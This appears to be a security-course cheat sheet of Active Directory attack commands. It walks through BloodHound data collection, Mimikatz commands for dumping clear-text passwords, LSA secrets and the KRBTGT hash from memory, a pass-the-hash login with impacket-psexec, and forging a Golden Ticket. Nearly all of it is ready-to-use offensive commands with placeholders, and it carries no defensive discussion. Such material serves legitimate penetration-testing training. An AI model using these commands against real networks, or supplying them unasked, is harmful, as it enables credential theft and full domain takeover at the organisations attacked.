# Module 18: Active Directory II Commands

### 1. BloodHound Workflow
1. **Collect Data**:
   `.\SharpHound.exe -c All`
2. **Upload**: Import the resulting ZIP file into the BloodHound GUI.
3. **Analyze**: Use the query "Find Shortest Paths to Domain Admins".

### 2. Mimikatz (The Credential Stealer)
Mimikatz is the most powerful tool for extracting passwords and hashes from memory (LSASS process).

| Command | Description | Use Case |
| :--- | :--- | :--- |
| `privilege::debug` | Enable debug privileges | Required for most Mimikatz commands. |
| `sekurlsa::logonpasswords` | Dump clear-text passwords | Steal passwords from memory. |
| `lsadump::lsa /patch` | Dump LSA secrets | Get the KRBTGT hash. |
| `kerberos::golden` | Create a Golden Ticket | Forge a TGT. |

### 3. Pass-the-Hash with Impacket
Instead of a password, use the NTLM hash (`hash:hash`):
```bash
impacket-psexec -hashes :<ntlm_hash> administrator@<target_ip>
```

### 4. Creating a Golden Ticket
Using Mimikatz:
```powershell
kerberos::golden /user:Administrator /domain:company.local /sid:S-1-5-21-... /krbtgt:<krbtgt_hash> /id:500
```
